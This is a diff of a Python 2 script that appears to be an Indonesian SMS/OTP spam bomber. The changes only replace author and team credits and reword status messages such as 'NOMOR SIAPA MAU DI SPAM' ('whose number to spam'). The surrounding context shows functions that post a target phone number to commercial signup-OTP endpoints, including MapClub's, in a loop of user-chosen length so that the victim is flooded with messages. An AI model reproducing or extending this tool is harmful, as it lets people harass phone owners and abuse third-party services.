@@ -1,7 +1,7 @@
 #!/usr/bin/python2
-# Author : ./Sabila152
-# Team : Cyber Girl Indonesian( BCA - X666X )
-# Apa Liat Liat ? Mau Recode ? >_<
+# Author : .MR KALIT09
+# Team : TEAM Z INDONESIA
+# DAH LAH ADA TUKANG RECODE 
 # Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3
 
 M = '\033[1;31m'
@@ -38,7 +38,7 @@ try:
 /\__/ / |_) | (_| | | | | | | /\__/ / | | | | \__ \\
 \____/| .__/ \__,_|_| |_| |_| \____/|_| |_| |_|___/
       | |                                          
-      |_|  '''+W+'Creator : ./Sabila\n\t\tYT : HackSael')
+      |_|  '''+W+'Creator : ./MR KALIT09\n\t\tYT : KEPO YAK')
 
 	def MapClub(Phone, Amount):
 		for _ in range(Amount):
@@ -52,10 +52,10 @@ try:
 			postData = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data = {'phone' : Phone}, allow_redirects = True)
 
 			if 'error' in postData.text:
-				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
+				print(W+'['+C+'*'+W+'] MAU KIRIM KEMANA NGAB '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
 			
 			else:
-				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
+				print(W+'['+C+'*'+W+'] MAU KIRIM KEMANA NGAB '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
 					
 	def Hooq(Phone, Amount):
 		for _ in range(Amount):
@@ -82,10 +82,10 @@ try:
 				sys.exit() 
 			
 			elif 'buCode' in submit.geturl():
-				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
+				print(W+'['+C+'*'+W+'] NOMOR SIAPA MAU DI SPAM '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
 			
 			else:
-				print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
+				print(W+'['+C+'*'+W+'] NOMOR SIAPA MAU DI SPAM '+C+str(Phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
 
 	def HarVest(Phone, Amount):
 		for _ in range(Amount):
